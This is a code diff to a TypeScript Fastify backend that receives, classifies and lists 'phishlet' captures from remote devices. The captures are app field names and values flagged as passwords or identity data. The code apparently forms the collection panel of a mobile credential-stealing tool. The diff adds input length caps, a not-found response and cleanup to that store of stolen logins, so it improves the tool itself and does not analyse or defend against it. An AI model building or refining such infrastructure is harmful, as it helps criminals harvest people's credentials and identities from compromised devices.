@@ -1,8 +1,8 @@
 import type { FastifyInstance } from 'fastify';
 import { getDb } from '../db/index.js';
-import { phishInbox, clients } from '../db/schema.js';
+import { phishInbox } from '../db/schema.js';
 import { eq, desc, and, sql } from 'drizzle-orm';
-import { requirePermission, getRequestUser } from '../middleware/auth.js';
+import { requirePermission } from '../middleware/auth.js';
 import { classifyCapture, classifyForm } from '../utils/phishClassifier.js';
 
 export async function phishInboxRoutes(app: FastifyInstance) {
@@ -12,7 +12,6 @@ export async function phishInboxRoutes(app: FastifyInstance) {
   }, async (request) => {
     const { unread, category, captureType, clientId, starred, search } = request.query as any;
     const d = getDb();
-    let query = d.select().from(phishInbox);
 
     const conditions = [];
     if (unread === 'true') conditions.push(eq(phishInbox.read, false));
@@ -49,7 +48,7 @@ export async function phishInboxRoutes(app: FastifyInstance) {
   }, async (request) => {
     const { id } = request.params as { id: string };
     const d = getDb();
-    d.update(phishInbox).set({ read: true }).where(eq(phishInbox.id, parseInt(id))).run();
+    d.update(phishInbox).set({ read: true }).where(eq(phishInbox.id, parseInt(id, 10))).run();
     return { success: true };
   });
 
@@ -65,14 +64,16 @@ export async function phishInboxRoutes(app: FastifyInstance) {
   // Toggle star
   app.post('/api/phish-inbox/:id/star', {
     preHandler: [app.auth, requirePermission('device:phishlet')],
-  }, async (request) => {
+  }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const d = getDb();
-    const row = d.select().from(phishInbox).where(eq(phishInbox.id, parseInt(id))).get();
-    if (row) {
-      d.update(phishInbox).set({ starred: !row.starred }).where(eq(phishInbox.id, parseInt(id))).run();
+    const row = d.select().from(phishInbox).where(eq(phishInbox.id, parseInt(id, 10))).get();
+    if (!row) {
+      return reply.code(404).send({ success: false, error: 'Capture not found' });
     }
-    return { success: true, data: { starred: !row?.starred } };
+    const newStarred = !row.starred;
+    d.update(phishInbox).set({ starred: newStarred }).where(eq(phishInbox.id, parseInt(id, 10))).run();
+    return { success: true, data: { starred: newStarred } };
   });
 
   // Delete one
@@ -81,7 +82,7 @@ export async function phishInboxRoutes(app: FastifyInstance) {
   }, async (request) => {
     const { id } = request.params as { id: string };
     const d = getDb();
-    d.delete(phishInbox).where(eq(phishInbox.id, parseInt(id))).run();
+    d.delete(phishInbox).where(eq(phishInbox.id, parseInt(id, 10))).run();
     return { success: true };
   });
 
@@ -143,6 +144,9 @@ export async function phishInboxRoutes(app: FastifyInstance) {
 }
 
 /** Called from socket handler when device emits phishlet data. */
+const MAX_FIELD_VALUE = 4096;
+const MAX_FORM_DATA = 65536;
+
 export function ingestPhishCapture(clientId: string, payload: {
   packageName?: string;
   fieldName?: string;
@@ -151,9 +155,10 @@ export function ingestPhishCapture(clientId: string, payload: {
   formData?: string;
   phishletType?: string;
 }) {
+  if (!clientId) return;
   const d = getDb();
   const pkg = payload.packageName || '';
-  const formData = payload.formData;
+  const formData = payload.formData?.slice(0, MAX_FORM_DATA);
 
   // If we have full form data, classify and store each field
   if (formData) {
@@ -180,7 +185,8 @@ export function ingestPhishCapture(clientId: string, payload: {
   }
 
   // Single field capture
-  const c = classifyCapture(pkg, payload.fieldName || '', payload.fieldValue || '');
+  const cappedValue = (payload.fieldValue || '').slice(0, MAX_FIELD_VALUE);
+  const c = classifyCapture(pkg, payload.fieldName || '', cappedValue);
   d.insert(phishInbox).values({
     clientId,
     packageName: pkg,
@@ -188,7 +194,7 @@ export function ingestPhishCapture(clientId: string, payload: {
     appCategory: c.appCategory,
     captureType: c.captureType,
     fieldName: payload.fieldName || '',
-    fieldValue: payload.fieldValue || '',
+    fieldValue: cappedValue,
     fieldType: payload.fieldType || 'text',
     confidence: c.confidence,
     isPassword: c.isPassword,
@@ -197,3 +203,7 @@ export function ingestPhishCapture(clientId: string, payload: {
     isIdentity: c.isIdentity,
   }).run();
 }
+
+// Re-export so socket.ts can import classifyCapture from this module
+export { classifyCapture } from '../utils/phishClassifier.js';
+          
